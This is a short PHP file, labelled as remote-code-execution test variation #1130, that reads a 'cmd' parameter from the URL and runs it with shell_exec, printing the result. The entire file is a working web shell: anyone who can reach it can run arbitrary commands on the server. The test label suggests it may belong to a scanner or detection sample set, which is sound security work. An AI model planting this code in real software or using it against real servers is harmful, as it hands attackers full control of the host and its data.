<?php
// RCE test variation #1130
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>